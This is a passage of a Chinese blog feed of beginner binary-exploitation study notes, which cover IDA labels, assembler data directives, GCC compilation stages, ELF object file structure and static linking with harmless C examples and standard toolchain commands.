表示这是一个向上的引用。</li></ul><p>这些交叉引用信息可以帮助你理解数据在程序中的使用情况。例如，你可以通过查看 <code>dword_80490E8</code> 的交叉引用，来找出所有使用这个数据的代码。</p><h3 id="3、aOmeToCtfshowPw-："><a href="#3、aOmeToCtfshowPw-：" class="headerlink" title="3、aOmeToCtfshowPw ："></a>3、<strong>aOmeToCtfshowPw</strong> ：</h3><p>并不是一个命令，而是 IDA 在反汇编过程中，为了方便阅读，自动生成的一个<strong>标签</strong>。这个标签的名字可能会因 IDA 的版本和设置的不同而有所不同。</p><h3 id="4、dd命令和dd命令的区别："><a href="#4、dd命令和dd命令的区别：" class="headerlink" title="4、dd命令和dd命令的区别："></a>4、dd命令和dd命令的区别：</h3><p><code>db</code> 和 <code>dd</code> 是汇编语言中的伪指令，用于在数据段中定义数据。它们的含义分别是 “define byte” 和 “define doubleword”。</p><ul><li><code>db</code>：定义一个字节的数据。例如，<code>msg db 'a'</code> 将定义一个名为 <code>msg</code> 的变量，它的值是字符 ‘a’ 的 ASCII 码。</li><li><code>dd</code>：定义一个四字节（doubleword）的数据。例如，<code>num dd 1234</code> 将定义一个名为 <code>num</code> 的变量，它的值是 1234。</li></ul><p>这两个伪指令都可以用来定义字符串。例如，<code>msg db 'Hello, world!'</code> 将定义一个包含 “Hello, world!” 这个字符串的变量。然而，由于 <code>db</code> 定义的是单字节的数据，所以这个字符串中的每个字符都将占用一个字节的空间。</p><p>另一方面，<code>dd</code> 定义的是四字节的数据，所以它可以用来定义一个包含四个字符的字符串。例如，<code>msg dd 'abcd'</code> 将定义一个包含 “abcd” 这个字符串的变量。这个字符串中的每个字符都将占用一个字节的空间，但是由于 <code>dd</code> 定义的是四字节的数据，所以这四个字符将被存储在一个四字节的空间中。</p><p>总的来说，<code>db</code> 和 <code>dd</code> 的主要区别在于它们定义的数据的大小：<code>db</code> 定义的是单字节的数据，而 <code>dd</code> 定义的是四字节的数据。</p><h2 id="四、ubuntun解析"><a href="#四、ubuntun解析" class="headerlink" title="四、ubuntun解析"></a>四、ubuntun解析</h2>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译与目标文件结构</title>
      <link href="/du-yu/pwn-begain-study02.html"/>
      <url>/du-yu/pwn-begain-study02.html</url>
      
        <content type="html"><![CDATA[<h1 id="编译和目标文件结构"><a href="#编译和目标文件结构" class="headerlink" title="编译和目标文件结构"></a><strong>编译和目标文件结构</strong></h1><h2 id="一、编译"><a href="#一、编译" class="headerlink" title="一、编译"></a>一、编译</h2><p>（GCC）编译环境</p><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-hello-c"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-hello-c" class="headerlink" title="1、root@ubuntu ~/3/pwn# gcc hello.c"></a>1、root@ubuntu ~/3/pwn# gcc hello.c</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-12.jpg" alt="001-12"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-6.jpg" alt="001-6"></p><h2 id="1、预编译"><a href="#1、预编译" class="headerlink" title="1、预编译"></a>1、预编译</h2><p>、</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-7.jpg" alt="001-7"></p><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-E-ctf-c-o-ctf-i"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-E-ctf-c-o-ctf-i" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc-E ctf.c-o ctf.i"></a>1、root@ubuntu~/3/pwn# gcc-E ctf.c-o ctf.i</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-9.jpg" alt="001-9"></p><h2 id="2、编译"><a href="#2、编译" class="headerlink" title="2、编译"></a>2、编译</h2><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-S-ctf-c-o-ctf-s"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-S-ctf-c-o-ctf-s" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc -S ctf.c -o ctf.s"></a>1、root@ubuntu~/3/pwn# gcc -S ctf.c -o ctf.s</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-8.jpg" alt="001-8"></p><h3 id="2、编译器原理"><a href="#2、编译器原理" class="headerlink" title="2、编译器原理"></a>2、编译器原理</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-10.jpg" alt="001-10"></p><h3 id="3、汇编器"><a href="#3、汇编器" class="headerlink" title="3、汇编器"></a>3、汇编器</h3><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-c-hello-s-m32-o-ctf-o"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-c-hello-s-m32-o-ctf-o" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc -c hello.s -m32 -o ctf.o"></a>1、root@ubuntu~/3/pwn# gcc -c hello.s -m32 -o ctf.o</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-11.jpg" alt="001-11"></p><h2 id="二、目标文件格式"><a href="#二、目标文件格式" class="headerlink" title="二、目标文件格式"></a>二、目标文件格式</h2><h3 id="objdump-常用工具"><a href="#objdump-常用工具" class="headerlink" title="objdump(常用工具)"></a>objdump(常用工具)</h3><p><strong><code>objdump</code>查看内存或文件中的数据时，这些工具通常会以十六进制的形式显示数据，因为十六进制比二进制更紧凑，而且比八进制和十进制更容易转换为二进制。</strong></p><p><strong><code>objdump -h</code>命令用于显示二进制文件的节头信息</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172305384.png" alt="image-20230709172305384"></p><ol><li><p>.text段 ：保存编译后的机器指令</p></li><li><p>.data段：保存全局变量和局部静态变量的数据  </p></li><li><p>.bss段：保存未初始化的全局变量和未初始化的局部静态变量</p></li><li><p>.comment：注释段                                                                                                                                                                      <strong>注：</strong><code>.comment</code>段是ELF文件中的一个可选段，通常包含了一些元数据，如编译器版本信息、操作系统版本信息、链接器版本信息等。这些信息对于程序的执行没有影响，但可能对调试、分析或理解二进制文件的来源和构建过程有帮助。</p></li><li><p>.note.GNU-stack:堆栈提示段    </p></li><li><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172053432.png" alt="image-20230709172053432"></p></li><li><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172825881.png"></p></li><li><p>root@ubuntu~/3/pwn# gcc -c SimpleSection.c -m32  #生成一个32位的文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库，这样我们就可以使用printf函数了int global_init_var = 84; // 定义并初始化一个全局变量global_init_var，初始值为84int global_uninit_var; // 定义一个全局变量global_uninit_var，未指定初始值，它会被自动初始化为0// 定义一个函数func1，它接受一个整数参数ivoid func1(int i) {    printf("%d\n", i); // 打印参数i的值}// 定义主函数main，它是程序的入口点int main(void) {    static int static_var1 = 85; // 在函数内部定义并初始化一个静态变量static_var1，初始值为85    static int static_var2; // 在函数内部定义一个静态变量static_var2，未指定初始值，它会被自动初始化为0    int a = 1; // 在函数内部定义并初始化一个局部变量a，初始值为1    func1(static_var1 + static_var2 + a); // 调用函数func1，参数为static_var1、static_var2和a的和    return a; // main函数返回a的值，也就是1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在再查看一下文件</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709175505000.png" alt="image-20230709175505000"></p><p><strong>注：.rodata段表示只读段</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-13.jpg" alt="001-13"></h2><h3 id="查看txt代码段：root-ubuntu-x2F-3-x2F-pwn-objdump-s-d-SimSleSection-o"><a href="#查看txt代码段：root-ubuntu-x2F-3-x2F-pwn-objdump-s-d-SimSleSection-o" class="headerlink" title="查看txt代码段：root@ubuntu~/3/pwn# objdump -s -d SimSleSection.o"></a>查看txt代码段：root@ubuntu~/3/pwn# objdump -s -d SimSleSection.o<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-15.jpg" alt="001-15"></h3><p>二进制代码段</p><p>汇编结果</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-16.jpg" alt="001-16"></p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709203945016.png" alt="image-20230709203945016"></p><p>因为是16进制，所以两个字符占用一个字节</p><p>右到左指的是字节</p><p><strong>在编程中，我们通常会根据变量的初始化方式来推断它的进制</strong>：如果一个数值前面没有任何前缀，并且只包含0-9的数字，那么我们通常认为它是一个十进制数。如果一个数值前面有<code>0x</code>或<code>0X</code>前缀，那么我们认为它是一个十六进制数。如果一个数值前面有<code>0b</code>或<code>0B</code>前缀，那么我们认为它是一个二进制数。如果一个数值前面有<code>0</code>前缀，那么我们认为它是一个八进制数。</p><h3 id="rodata段"><a href="#rodata段" class="headerlink" title="rodata段"></a>rodata段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709214554282.png" alt="image-20230709214554282"></h3><h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709215216928.png" alt="image-20230709215216928"></h3><h3 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-19.jpg" alt="001-19"></h3><p>目标程序编译程序时自定义段不能是.开头</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709220506695.png" alt="image-20230709220506695"></p><h3 id="elf文件结构描述"><a href="#elf文件结构描述" class="headerlink" title="elf文件结构描述"></a>elf文件结构描述</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-20.jpg" alt="001-20"></p><h3 id="elf文件头（root-ubuntu-x2F-3-x2F-pwnf-readelf-h-SimpleSection-o）"><a href="#elf文件头（root-ubuntu-x2F-3-x2F-pwnf-readelf-h-SimpleSection-o）" class="headerlink" title="elf文件头（root@ubuntu~/3/pwnf readelf -h SimpleSection.o）"></a>elf文件头（root@ubuntu~/3/pwnf readelf -h SimpleSection.o）</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709230802832.png" alt="image-20230709230802832"></p><p><strong>魔数</strong>：第一个字节表示<strong>delete</strong>，后面三个字节分别是<strong>e 、l 、 f</strong> 的<strong>ASCII</strong>值</p><p><strong>注：</strong>当操作系统加载一个可执行文件时，它会检查这个魔数来确定文件的格式，以便知道如何处理这个文件。如果这个魔数不是正确，那么操作系统不会按照ELF文件的方式来处理</p><p>魔数后的<strong>第五个字节01</strong>代表的<strong>32位</strong>，<strong>02</strong>代表<strong>64位</strong>，00代表是<strong>无效文件</strong> </p><p><strong>第六个字节01</strong>代表的是<strong>字节序</strong>，规定elf文件的<strong>大端小端（现在简单理解为存储顺序）</strong></p><p><strong>第七个字节01</strong>代表<strong>版本号<em>（一般固定为1）</em></strong></p><p>后面<strong>9个字节</strong>是<strong>扩展字节</strong>，<strong>没有定义</strong>，编译器可以加入自己的字节</p><p> <strong>“Start of sections headers”（节头开始）</strong>指的是ELF文件中<strong>节头表</strong>（Section Header Table）的起始位置。节头表是ELF文件中存储了各个节（Sections）信息的数据结构。每个节都包含了特定类型的数据，如代码、数据、符号表等。</p><h3 id="elf文件段表"><a href="#elf文件段表" class="headerlink" title="elf文件段表"></a>elf文件段表<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709231031674.png" alt="image-20230709231031674"></h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709233939056.png" alt="image-20230709233939056"></p><p><strong>注：</strong>如果一个段表是由40个0组成，那么它是由40个字节的值为0的连续内存组成的，每个0表示一个字节！！！(必须都为0才行)</p><p><strong>偏移地址</strong>：1092+15x40（15表示第十五个段）</p><h4 id="段描述："><a href="#段描述：" class="headerlink" title="段描述："></a>段描述：</h4><p>段名索引：<strong>11</strong>表示接下来11个字节用来<strong>储存段的名字</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710224448799.png" alt="image-20230710224448799"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710003604077.png" alt="image-20230710003604077"></p><h2 id="三、目标文件格式分析实践"><a href="#三、目标文件格式分析实践" class="headerlink" title="三、目标文件格式分析实践"></a>三、目标文件格式分析实践</h2><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>1.touch 创建文件</p><p>2.ls一下</p><p>3.用vim编译器打开文件</p><p>4.敲代码</p><p>5.gcc -c study001.c -m32          ：1.-c选项表示只进行编译而不进行链接   2.编译C语言<strong>源文件</strong>并生成<strong>目标文件</strong></p><p>6.ls查看**.o**文件生成</p><p>7.查看study001.o文件发现是乱码、</p><p>8.objdump -h study001.o 查看目标文件头部信息</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711102005789.png" alt="image-20230711102005789"></p><h3 id="4-编译文件"><a href="#4-编译文件" class="headerlink" title="4.编译文件"></a>4.编译文件</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710234254606.png" alt="image-20230710234254606"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库int global_int_84; // 定义一个全局变量，名为 global_int_84，但没有初始化，应该有一个初始值，例如 int global_int_84 = 84;int global_uninit_var; // 定义一个未初始化的全局变量，名为 global_uninit_var，默认值为 0void funcl(int i){ // 定义一个函数，名为 funcl，它接受一个整数参数        printf("%d\n",i); // 在控制台上打印参数 i 的值，然后换行}int main(){ // 定义主函数，程序的执行从这里开始        static int static_var = 85; // 定义一个静态局部变量，名为 static_var，初始值为 85        static int static_var2; // 定义一个未初始化的静态局部变量，名为 static_var2，默认值为 0        int a=1; // 定义一个局部变量，名为 a，初始值为 1        int b; // 定义一个未初始化的局部变量，名为 b，其初始值是未定义的        funcl(static_var+static_var2+a+b); // 调用 funcl 函数，参数为 static_var、static_var2、a 和 b 的和        return a; // 主函数返回 a 的值，即 1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按Esc键退出编辑，输入“  ：wq   ” 然后回车</p><p>9.readelf -h study001.o 打开目标文件的<strong>elf头部信息</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711000106572.png" alt="image-20230711000106572"></p><p>section header string table index: 14</p><p>段表最后一行40个字节是段表名称的<strong>字符串</strong>所在的<strong>段</strong>的信息</p><h3 id="od-study001-o查看文件-amp-用010分析文件"><a href="#od-study001-o查看文件-amp-用010分析文件" class="headerlink" title="od study001.o查看文件&amp;用010分析文件"></a>od study001.o查看文件&amp;用010分析文件</h3><p>od（octal dump）命令可以将文件内容转换为八进制形式，并以十六进制和ASCII码方式显示。这可以帮助我们查看目标文件的二进制数据，包括文件头部、节（section）的内容以及其他数据。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711112050940.png" alt="image-20230711112050940"></p><p>把study001.o放到010中分析</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711010437475.png" alt="image-20230711010437475"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711010621855.png" alt="image-20230711010621855"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711012214621.png" alt="image-20230711012214621"></p><h2 id="四、符号表："><a href="#四、符号表：" class="headerlink" title="四、符号表："></a>四、符号表：</h2><p>1.符号名=函数名+变量名<strong>（函数和变量统称为符号）</strong></p><p>2.符号是整个链接的粘合器，整个链接<strong>基于符号</strong>才能完成</p><p>3.每一个目标文件都有一个符号表</p><p>4.符号值是函数和变量的<strong>地址</strong></p><p>每16个字节代表一个符号</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门课程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链接</title>
      <link href="/du-yu/pwn-begain-study03.html"/>
      <url>/du-yu/pwn-begain-study03.html</url>
      
        <content type="html"><![CDATA[<h1 id="链接（LINKING）"><a href="#链接（LINKING）" class="headerlink" title="链接（LINKING）"></a>链接（LINKING）</h1><h2 id="一、静态链接"><a href="#一、静态链接" class="headerlink" title="一、静态链接"></a>一、静态链接</h2><p>如果目标文件引用了另外一个目标文件，那么需要生成静态链接 </p><h3 id="1-创建两个C源文件"><a href="#1-创建两个C源文件" class="headerlink" title="1.创建两个C源文件"></a>1.创建两个C源文件</h3><h4 id="002linking-c"><a href="#002linking-c" class="headerlink" title="002linking.c"></a>002linking.c</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">extern int shared;extern void swap(int* a,int* b);int main(){        int a=100;        swap(&amp;a,&amp;shared);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="002linking02-c"><a href="#002linking02-c" class="headerlink" title="002linking02.c"></a>002linking02.c</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">int shared = 1;void swap(int* a,int* b){        *a ^= *b ^= *a ^= *b;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、生成目标文件"><a href="#2、生成目标文件" class="headerlink" title="2、生成目标文件"></a>2、生成目标文件</h3><p>gcc -c 002linking.c  002linking02.c -fno-stack-protector -m32   生成<strong>002linking.o</strong> 和 <strong>002linking02.o</strong>两个**.o**文件(<code>-fno-stack-protector</code>选项用于关闭栈保护)</p><h3 id="3、将两个文件链接成一个可执行文件"><a href="#3、将两个文件链接成一个可执行文件" class="headerlink" title="3、将两个文件链接成一个可执行文件"></a>3、将两个文件链接成一个可执行文件</h3><p>ld -m elf_i386 002linking.o 002linking02.o -e main -o 002linking03</p><p>注：</p><p>1.使用<code>ld</code>链接器，按照32位的Intel架构，将 002linking.o 和 002linking02.o 这两个目标文件链接成一个可执行文件002linking03，可执行文件的入口点是<code>main</code>函数（运行程序时，<code>main</code>函数会被首先执行）。</p><p>2.-m elf_i386：指定了链接器的目标架构为32位的x86架构</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711141344927.png" alt="image-20230711141344927"></p><h3 id="4、静态链接以后多出4个字节"><a href="#4、静态链接以后多出4个字节" class="headerlink" title="4、静态链接以后多出4个字节"></a>4、静态链接以后多出4个字节</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711142353390.png" alt="image-20230711142353390"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711143043203.png" alt="image-20230711143043203"></p><h4 id="查看002linking-o-text段描述-objdump-S"><a href="#查看002linking-o-text段描述-objdump-S" class="headerlink" title="查看002linking.o    text段描述(objdump -S )"></a>查看002linking.o    text段描述(objdump -S )</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204453642.png" alt="image-20230711204453642"></p><h4 id="002linking02-o文件"><a href="#002linking02-o文件" class="headerlink" title="002linking02.o文件"></a>002linking02.o文件</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204555890.png" alt="image-20230711204555890"></p><h4 id="002linking03文件"><a href="#002linking03文件" class="headerlink" title="002linking03文件"></a>002linking03文件</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204630037.png" alt="image-20230711204630037"></p><h2 id="二、空间与地址分配"><a href="#二、空间与地址分配" class="headerlink" title="二、空间与地址分配"></a>二、空间与地址分配</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712002022380.png" alt="image-20230712002022380"></p><p>32位的Linux系统，程序的虚拟地址空间通常从0x08048000开始。这是因为Linux内核默认将用户空间程序的基地址（也就是.text段的加载地址）设置为0x08048000。这个地址是在内核源代码中硬编码的。</p><h2 id="三、重定位"><a href="#三、重定位" class="headerlink" title="三、重定位"></a>三、重定位</h2><p>1.上面使用 <strong>ld</strong> 链接器将把两个.o文件链接在一起以创建一个可执行文件时，链接器会<strong>自动处理全局符号</strong>重定位。</p><p>2.链接器首先会读取所有输入的目标文件，并收集所有的符号定义和引用。这些信息存储在符号表中。</p><p>3.然后，链接器会解决所有的符号引用。对于每个引用，链接器会查找对应的符号定义，然后计算出该符号在最终可执行文件中的地址。</p><p>4.最后，链接器会更新所有需要重定位的地址引用。这些引用的位置和方式存储在重定位表中。对于表中的每个条目，链接器会根据符号的最终地址和重定位类型，更新对该符号的引用。</p><h3 id="1、重定位效果：objdump-d-分别查看反汇编结果"><a href="#1、重定位效果：objdump-d-分别查看反汇编结果" class="headerlink" title="1、重定位效果：objdump -d 分别查看反汇编结果"></a>1、重定位效果：objdump -d 分别查看反汇编结果</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712105715702.png" alt="image-20230712105715702"></p><h3 id="2、重定位表"><a href="#2、重定位表" class="headerlink" title="2、重定位表"></a>2、重定位表</h3><p>1、链接器要知道哪些指令要被调整，需要给链接器一个清单，这个清单就是重定位表</p><p>2、重定位表一般是ELF文件的一个段，如.text段重定位表就是rel.text,data段的重定位表就是rel.data</p><h4 id="使用objdump-r-a-o可以看到重定位表"><a href="#使用objdump-r-a-o可以看到重定位表" class="headerlink" title="使用objdump -r a.o可以看到重定位表"></a>使用objdump -r a.o可以看到重定位表</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712113952650.png" alt="image-20230712113952650"></p><p><strong>十六进制寻址：</strong>在”00000028”中，最右边的位是8，它是第0位，所以你将8乘以16的0次方得到8*1=8。</p><p>然后，向左移动一位，你有2，这是第1位，所以你将2乘以16的1次方得到2*16=32。</p><h2 id="四、链接的符号解析功能"><a href="#四、链接的符号解析功能" class="headerlink" title="四、链接的符号解析功能"></a>四、链接的符号解析功能</h2><p>1、a.c在生成目标文件的时候，并没有定义share变量和swap函数，但是在没有链接之前，gcc也不能说这两</p><p>个引用不存在，那么怎么确定是外部引用的符号，还是源代码手滑写错了的符号呢？</p><p>2、那就是用链接器在全局符号表中查找，能找到就进行修正虚拟地址，找不到肯定不能链接通过，因为调</p><p>用了不存在的引用</p><h3 id="1、objdump-s"><a href="#1、objdump-s" class="headerlink" title="1、objdump  -s"></a>1、objdump  -s</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712132412141.png" alt="image-20230712132412141"></p><h2 id="五、静态库链接"><a href="#五、静态库链接" class="headerlink" title="五、静态库链接"></a>五、静态库链接</h2><p>静态库</p><p>目前理解就是一个运行调用的 库而已</p><h2 id="六、进程虚拟地址空间"><a href="#六、进程虚拟地址空间" class="headerlink" title="六、进程虚拟地址空间"></a>六、进程虚拟地址空间</h2><p>1、32位操作系统的最大寻址范围位4GB</p><p>2、64位操作系统的最大寻址范围围位17 179 869 184 GB，即2的64次方 = 16EiB，通常而言，操作系统虚</p><p>拟地址空间无需这么大的空间，于是通常设定64位操作系统的虚拟地址寻址空间大小是<strong>48位</strong>，也就是<strong>2的48</strong></p><p><strong>次方</strong> = 256TB</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712164945449.png" alt="image-20230712164945449"></p><h4 id="1-采用十六进制转化位十进制寻址："><a href="#1-采用十六进制转化位十进制寻址：" class="headerlink" title="1.采用十六进制转化位十进制寻址："></a>1.采用十六进制转化位十进制寻址：</h4><p>0xC0000000=<strong>12 * 16^7 + 0 * 16^6 + 0 * 16^5 + 0 * 16^4 + 0 * 16^3 + 0 * 16^2 + 0 * 16^1 + 0 * 16^0</strong>= 3221225472</p><p>0xFFFFFFFF=4,294,967,295=4GB</p><p>0xFFFFFFFF-0xC0000000=1GB</p><h4 id="补充：十六进制转化为2进制"><a href="#补充：十六进制转化为2进制" class="headerlink" title="补充：十六进制转化为2进制"></a>补充：十六进制转化为2进制</h4><p>因为16等于2的4次方，所以每个十六进制数字都可以用4个二进制位来表示。</p><p>例如，如果我们要将F（十六进制中的15）转换为二进制，我们可以这样做：</p><ol><li>首先，我们知道F在十六进制中代表15。</li><li>然后，我们可以将15转换为二进制。这可以通过以下步骤完成：<ul><li>15除以2等于7余1，所以最低位是1。</li><li>7除以2等于3余1，所以下一位是1。</li><li>3除以2等于1余1，所以下一位是1。</li><li>1除以2等于0余1，所以最高位是1。</li></ul></li><li>因此，15在二进制中表示为1111。</li></ol><h2 id="七、装载方式"><a href="#七、装载方式" class="headerlink" title="七、装载方式"></a>七、装载方式</h2><p>和前面计算机基础中的分页技术差不多</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712170412317.png" alt="image-20230712170412317"></p><h2 id="八、覆盖装入"><a href="#八、覆盖装入" class="headerlink" title="八、覆盖装入"></a>八、覆盖装入</h2><p> 原理：目前处理谁的数据就让谁坐在处理的位置上 </p><p>医生看病原理：病人A问诊后被医生叫去拍片，病人B问诊后拍片…，直到病人A拿到片子回来后其他病人停</p><p>止问诊，医生给病人A看片，病人A就是覆盖装入</p><h2 id="九、页映射"><a href="#九、页映射" class="headerlink" title="九、页映射"></a>九、页映射</h2><p>1、页映射不是一下子把程序的所有数据和指令都装入内存</p><p>2、而是将内存和磁盘中所有的数据和指令按照页（page）为单位划分成若干个页</p><p>3、目前常见的页大小为4096字节，也就是4KB，1KB的数据也是交换4KB，交换的就是4KB的倍数</p><h2 id="十、进程虚拟空间分布"><a href="#十、进程虚拟空间分布" class="headerlink" title="十、进程虚拟空间分布"></a>十、进程虚拟空间分布</h2><p>1、合并<strong>相同权限</strong>的段（Section）到同一个节（Segment）</p><p>2、对于相同权限的段，把它们合并到一起当作一个节（Segment）进行映射</p><p>3、节（Segment）装载的角度<strong>重新划分</strong>了ELF的各个段</p><p>之前段已经划分好了，接下来就是划分节了</p><p><strong>如：</strong>滴滴打车，每个人至少叫一 辆车（不可能半辆），相当于ElF文件执行程序至少需要一个页，如果有20个人</p><p>去5个小区，每人一辆车就浪费了，如果按照相同属性划分（同一个小区的为一类）节，就可以只要5辆车，</p><p>利用资源。   合并加载便于页映射，减少出现<strong>1KB</strong>的数据也是交换<strong>4KB</strong>的情况，利用资源</p><p>1、<strong>Section</strong>和<strong>Segment</strong>是对ElF文件描述的两种视图</p><p>2、<strong>Section</strong>偏向于静态链接（链接视图Linking View）</p><p>3、<strong>Segment</strong>偏向于<strong>动态转载</strong>（执行视图Execution View）</p><h3 id="1、例子C源码00204-c"><a href="#1、例子C源码00204-c" class="headerlink" title="1、例子C源码00204.c"></a>1、例子C源码00204.c</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;char*flag ="CTFDU-YU{flag_is_here}";int main(){ printf("%s",flag); return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-静态编译-gcc-static-00204-c-m32-o-00204"><a href="#2-静态编译-gcc-static-00204-c-m32-o-00204" class="headerlink" title="2.静态编译  gcc -static 00204.c -m32 -o 00204"></a>2.静态编译  gcc -static 00204.c -m32 -o 00204</h4><p>生成静态链接可执行文件</p><p>readelf -S text2 查看段信息，readlelf -l text2 查看节信息</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713003655633.png" alt="image-20230713003655633"></p><ul><li>Type：段的类型。例如，LOAD 表示该段应加载到内存中，NOTE 表示该段包含辅助信息，GNU_STACK 表示该段包含堆栈信息，等等。</li><li>Offset：该段在文件中的偏移量。</li><li>VirtAddr：该段在内存中的虚拟地址（程序入口）</li><li>PhysAddr：该段在内存中的物理地址。对于可执行和共享对象文件，此字段通常被忽略。</li><li>FileSiz：该段在文件中的大小。</li><li>MemSiz：该段在内存中的大小。</li><li>Flg：该段的标志。R 表示可读，W 表示可写，E 表示可执行。</li><li>Align：该段在文件和内存中的对齐</li></ul><p>Section to Segement mapping 中写清楚了那些段映射到了哪些节</p><p>LOAD类型说明是需要映射的，其他不需要映射</p><p>上图就是相同权限的段合并到同一个节中</p><p>前两节通过Flg段得知：</p><p>00 可读可执行 可以看到里面有.text .rodata段</p><p>01 可读可写 可以看到里面有.data段</p><p>Align：字节对齐</p><p>1000h=4kb，所以两个节分别映射到两个页中</p><h2 id="十一、程序表头"><a href="#十一、程序表头" class="headerlink" title="十一、程序表头"></a>十一、程序表头</h2><p>1.ElF可执行文件中有一个专门的数据结构叫程序头表（Program Header Table），用来保存Segment信息</p><p>2.程序头表（Program Header Table）：这部分主要用于程序的加载。它描述了一系列的段（Segment），每个段包含了一些在程序执行时需要加载到内存中的信息。例如，代码段（.text）包含了程序的机器代码，数据段（.data）包含了程序的全局变量等。</p><p>3。无论是静态编译还是动态编译，只要生成了 ELF 